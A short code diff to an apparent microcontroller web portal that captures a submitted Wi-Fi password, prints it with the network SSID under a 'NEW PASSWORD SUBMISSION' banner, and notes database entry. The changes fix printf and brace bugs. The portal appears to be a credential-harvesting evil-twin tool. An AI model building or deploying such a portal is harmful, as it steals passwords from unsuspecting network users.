@@ -1,5 +1,7 @@
 #include"WebPortal.h"
 
+String SSID = "";
+
 namespace WebPortal{
     String getHTML(){
         String HTMLTemplate = 
@@ -45,18 +47,17 @@ namespace WebPortal{
         if (server.hasArg("passwordInput")) {
             String userPW = server.arg("passwordInput");
             Serial.println("--------NEW PASSWORD SUBMISSION--------");
-            Serial.printf("SSID: %s\n", SSID);
-            Serial.printf("Password: %s\n", userPW);
+            Serial.printf("SSID: %s\n", SSID.c_str());
+            Serial.printf("Password: %s\n", userPW.c_str());
 
             
             if(internetConnection){
                 Serial.printf("Entering into database");
-        } else {
-            Serial.println("No password entered.");
+            } else {
+                Serial.println("No password entered.");
+            }
+
+          server.send(200, "text/html", getHTML());
         }
-
-        server.send(200, "text/html", getHTML());
     }
-
-    
 } 
